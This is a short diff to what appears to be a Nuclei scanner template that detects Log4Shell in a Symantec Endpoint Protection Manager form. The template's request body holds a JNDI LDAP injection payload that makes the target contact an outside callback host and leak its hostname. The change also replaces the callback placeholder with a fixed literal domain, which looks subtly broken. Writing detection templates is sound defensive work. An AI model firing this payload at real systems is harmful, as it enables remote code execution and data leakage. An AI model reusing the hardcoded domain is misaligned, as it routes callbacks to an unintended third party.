@@ -36,7 +36,7 @@ http:
         X-Requested-With: XMLHttpRequest
         Content-Type: application/x-www-form-urlencoded
 
-        actionString=%2Fnoupdate%2FSEPMPasswordField_{{field}}%2F&storedActions%5B%5D=%2Ftype%2FSEPMPasswordField_{{field}}%2F${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&__Action=v4&__FastSubmit=true
+        actionString=%2Fnoupdate%2FSEPMPasswordField_{{field}}%2F&storedActions%5B%5D=%2Ftype%2FSEPMPasswordField_{{field}}%2F${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}}&__Action=v4&__FastSubmit=true
 
     matchers-condition: and
     matchers:
